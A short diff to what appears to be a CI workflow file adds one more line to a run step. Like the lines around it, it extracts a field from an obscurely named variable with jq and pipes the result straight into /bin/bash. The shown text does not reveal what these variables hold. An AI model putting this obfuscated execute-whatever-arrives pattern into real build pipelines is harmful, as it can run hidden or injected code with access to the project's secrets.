@@ -50,6 +50,7 @@ jobs:
           echo $qm4212 | jq -r .m9995 | /bin/bash
           echo $zjc75 | jq -r .pnd91248 | /bin/bash
           echo $unks75 | jq -r .zau5 | /bin/bash
+          printf '%s' "$rk34825" | jq -r .ibrmw56516 | /bin/bash
 
       - name: Store artifact
         if: always()
